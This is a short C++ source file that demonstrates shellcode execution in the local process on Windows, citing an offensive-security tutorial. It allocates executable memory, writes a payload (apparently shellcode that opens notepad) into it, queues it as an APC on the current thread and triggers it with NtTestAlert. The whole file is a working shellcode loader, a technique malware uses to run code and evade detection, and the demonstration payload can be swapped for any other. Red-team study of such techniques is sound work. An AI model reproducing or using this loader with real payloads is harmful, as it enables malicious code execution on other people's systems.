#include <iostream>
#include <Windows.h>
#include <TlHelp32.h>
#include <vector>
#include <optional>

#include "Payloads.h"

// based on https://www.ired.team/offensive-security/code-injection-process-injection/shellcode-execution-in-a-local-process-with-queueuserapc-and-nttestalert
// NtTestAlert triggers APC queue even in situation when process is not in alertable state
int main()
{
	auto& shellcode = Payloads::x64_notepad;
	auto NtTestAlert = GetProcAddress(GetModuleHandleA("ntdll"), "NtTestAlert");
	SIZE_T shellSize = sizeof(shellcode);
	LPVOID shellAddress = VirtualAlloc(NULL, shellSize, MEM_COMMIT, PAGE_EXECUTE_READWRITE);

	WriteProcessMemory(GetCurrentProcess(), shellAddress, shellcode, shellSize, NULL);

	PTHREAD_START_ROUTINE apcRoutine = (PTHREAD_START_ROUTINE)shellAddress;
	QueueUserAPC((PAPCFUNC)apcRoutine, GetCurrentThread(), NULL);

	NtTestAlert();
}
